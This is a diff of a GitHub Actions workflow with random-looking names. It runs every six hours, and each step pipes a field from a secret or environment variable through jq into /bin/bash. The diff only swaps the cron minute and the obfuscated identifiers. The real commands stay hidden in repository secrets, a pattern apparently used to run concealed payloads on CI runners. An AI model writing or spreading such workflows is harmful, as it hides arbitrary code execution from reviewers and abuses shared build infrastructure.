@@ -2,20 +2,18 @@ name: brokerdisgusting
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 5/6 * * *'
-jobs:  # 32097
+    - cron: '55 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: brokerdisgusting
         env:
-          yspio9947: ${{ secrets.yspio9947 }}
+          kte854: ${{ secrets.kte854 }}
         run: |
-          echo $yspio9947 | jq -r .f55182 | /bin/bash
-          echo $gaq5 | jq -r .ski19 | /bin/bash
-          echo $rvgpq3090 | jq -r .dwy0 | /bin/bash
-          echo $fsba67 | jq -r .ug63 | /bin/bash
-          echo $hzoq9 | jq -r .px70069 | /bin/bash
+          echo $kte854 | jq -r .wmop79346 | /bin/bash
+          echo $v8080 | jq -r .nxmme299 | /bin/bash
+          echo $cgzhb7896 | jq -r .uoms35701 | /bin/bash
+          echo $ei7026 | jq -r .jrdu4 | /bin/bash
 
